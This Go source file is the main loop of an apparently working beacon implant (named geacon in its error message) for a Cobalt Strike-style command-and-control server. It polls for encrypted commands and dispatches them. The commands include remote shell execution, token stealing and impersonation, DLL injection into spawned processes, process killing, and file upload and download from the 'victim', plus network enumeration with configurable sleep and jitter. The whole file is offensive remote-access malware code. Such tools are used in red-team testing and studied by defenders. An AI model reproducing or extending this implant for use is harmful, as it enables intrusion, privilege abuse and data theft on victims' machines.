package main

import (
	"bytes"
	"fmt"
	"main/command"
	"main/config"
	"main/packet"
	"main/sysinfo"
	"main/util"
	"math/rand"
	"os"
	"time"
)

func main() {
	// set rand seed at beginning of the program
	rand.Seed(time.Now().UnixNano())
	ok := packet.FirstBlood()
	if ok {
		for {
			resp, err := packet.PullCommand()
			if err == nil {
				totalLen := len(resp)
				if totalLen > 0 {
					// end with 16 byte
					respByte := resp
					// hmacHash, useless
					_ = respByte[totalLen-util.HmacHashLen:]
					//fmt.Printf("hmac hash: %v\n", hmacHash)
					//TODO check the hmachash
					restBytes := respByte[:totalLen-util.HmacHashLen]
					decrypted := packet.DecryptPacket(restBytes)
					// first 4 bytes timestamp,useless
					_ = decrypted[:4]
					//fmt.Printf("timestamp: %v\n", timestamp)
					// 4 bytes data length
					lenBytes := decrypted[4:8]
					packetLen := packet.ReadInt(lenBytes)

					decryptedBuf := bytes.NewBuffer(decrypted[8:])
					for {
						if packetLen <= 0 {
							break
						}
						cmdType, cmdBuf := packet.ParsePacket(decryptedBuf, &packetLen)
						if cmdBuf != nil {
							fmt.Printf("Cmd type %d, Cmd buffer: %s\nCmd buffer bytes: %v\n", cmdType, cmdBuf, cmdBuf)
							var execErr error
							execErr = nil
							// replyType can be found at beacon.BeaconC2 process_beacon_callback_decrypted
							// it seems use CALLBACK_OUTPUT can solve chinese garbled, and utf8 can not
							switch cmdType {
							case command.CMD_TYPE_CHECKIN:
								_, execErr = packet.PullCommand()
							case command.CMD_TYPE_SHELL:
								execErr = command.Run(cmdBuf)
							case command.CMD_TYPE_EXECUTE:
								execErr = command.Exec(cmdBuf)
							case command.CMD_TYPE_RUNAS:
								execErr = command.RunAs(cmdBuf)
							case command.CMD_TYPE_GET_PRIVS:
								execErr = command.GetPrivsByte(cmdBuf)
							case command.CMD_TYPE_REV2SELF:
								execErr = command.Rev2self()
							case command.CMD_TYPE_STEAL_TOKEN:
								execErr = command.StealToken(cmdBuf)
							case command.CMD_TYPE_MAKE_TOKEN:
								execErr = command.MakeToken(cmdBuf)
							// TODO have no idea about how to deal with token
							case command.CMD_TYPE_SPAWN_TOKEN_X64:
								fallthrough
							case command.CMD_TYPE_SPAWN_IGNORE_TOKEN_X64:
								execErr = command.SpawnAndInjectDllX64(cmdBuf)
							case command.CMD_TYPE_SPAWN_TOKEN_X86:
								fallthrough
							case command.CMD_TYPE_SPAWN_IGNORE_TOKEN_X86:
								execErr = command.SpawnAndInjectDllX86(cmdBuf)
							case command.CMD_TYPE_INJECT_X86:
								fallthrough
							case command.CMD_TYPE_INJECT_X64:
								execErr = command.InjectDll(cmdBuf)
							case command.CMD_TYPE_JOB:
								execErr = command.HandlerJobAsync(cmdBuf)
							case command.CMD_TYPE_LIST_JOBS:
								execErr = command.ListJobs()
							case command.CMD_TYPE_JOBKILL:
								execErr = command.KillJob(cmdBuf)
							case command.CMD_TYPE_GET_UID:
								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT, []byte(sysinfo.GetUsername()))
								packet.PushResult(finalPacket)
							// even there is a CALLBACK_PROCESS_LIST, but still use PENDING
							case command.CMD_TYPE_PS:
								execErr = command.ListProcess(cmdBuf)
							case command.CMD_TYPE_KILL:
								execErr = command.KillProcess(cmdBuf)
							case command.CMD_TYPE_REMOVE:
								execErr = command.Remove(string(cmdBuf))
							case command.CMD_TYPE_FILE_COPY:
								execErr = command.CopyFile(cmdBuf)
							case command.CMD_TYPE_FILE_MOVE:
								execErr = command.MoveFile(cmdBuf)
							// UPLOAD_START and UPLOAD_LOOP is same
							case command.CMD_TYPE_UPLOAD_START:
								fallthrough
							case command.CMD_TYPE_UPLOAD_LOOP:
								execErr = command.Upload(cmdBuf)
							// download file from victim
							case command.CMD_TYPE_DOWNLOAD:
								execErr = command.Download(cmdBuf)
							case command.CMD_TYPE_FILE_BROWSE:
								execErr = command.FileBrowse(cmdBuf)
							case command.CMD_TYPE_CD:
								execErr = command.ChangeCurrentDir(cmdBuf)
							case command.CMD_TYPE_MAKEDIR:
								execErr = command.MakeDir(string(cmdBuf))
							case command.CMD_TYPE_SLEEP:
								sleep := packet.ReadInt(cmdBuf[:4])
								jitter := packet.ReadInt(cmdBuf[4:8])
								fmt.Printf("Now sleep is %d ms, jitter is %d%%\n", sleep, jitter)
								config.WaitTime = int(sleep)
								config.Jitter = int(jitter)
							case command.CMD_TYPE_PWD:
								execErr = command.GetCurrentDirectory()
							case command.CMD_TYPE_LIST_NETWORK:
								execErr = command.GetNetworkInformation(cmdBuf)
							case command.CMD_TYPE_EXIT:
								finPacket := packet.MakePacket(command.CALLBACK_DEAD, []byte("exit"))
								packet.PushResult(finPacket)
								os.Exit(0)
							default:
								errMsg := fmt.Sprintf("command type %d is not support by geacon now\n", cmdType)
								command.ErrorMessage(errMsg)
							}
							if execErr != nil {
								command.ErrorMessage(execErr.Error())
							}
						}
					}
				}
			}
			command.Sleep()
		}
	}

}